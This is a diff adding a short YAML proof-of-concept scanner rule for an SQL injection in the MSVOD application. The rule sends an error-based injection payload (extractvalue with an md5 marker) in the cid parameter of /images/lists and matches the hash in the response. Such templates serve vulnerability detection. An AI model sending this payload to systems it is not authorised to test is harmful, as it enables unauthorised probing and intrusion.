@@ -1,0 +1,10 @@
+name: poc-yaml-msvodx-sqli
+rules:
+  - method: GET
+    path: /images/lists?cid=1 ) ORDER BY 1 desc,extractvalue(rand(),concat(0x7c,md5(99999999))) desc --+a
+    expression: |
+      response.body.bcontains(b"ef775988943825d2871e1cfa75473ec")
+detail:
+  author: jinqi
+  links:
+    - https://github.com/jinqi520
